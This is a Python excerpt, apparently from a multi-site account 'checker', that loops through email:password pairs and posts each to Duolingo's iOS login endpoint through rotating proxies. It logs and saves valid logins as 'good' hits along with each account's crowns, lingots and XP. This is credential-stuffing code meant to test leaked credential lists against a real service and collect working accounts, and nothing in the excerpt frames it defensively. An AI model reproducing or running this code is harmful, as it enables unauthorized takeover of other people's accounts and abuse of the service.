    ...
    while not Checker.stopping:
        try:
            with Session() as s:
                ...
                data = dumps(
                    {
                        "password": password,
                        "identifier": email,
                        "fields": "currentCourse{trackingProperties},totalXp,trackingProperties,zhTw",
                        "distinctId": "EE2C72B5-A05E-42F9-9C09-928DEF7C4BF2",
                    }
                )
                r = s.post(
                    "https://ios-api-2.duolingo.com/2017-06-30/login",
                    data=data,
                    headers=header,
                )
                if r.text == "{}":
                ...
                if not Checker.cui:
                    log("good", ":".join([email, password]), "Duolingo")
                save(
                    "Duolingo",
                    "good",
                    Checker.time,
                    ":".join([email, password])
                    + f" | Crowns: {crowns} | Lingots: {lingots} | XP: {xp}",
                )
                Checker.good += 1
                return_proxy(proxy)
                return
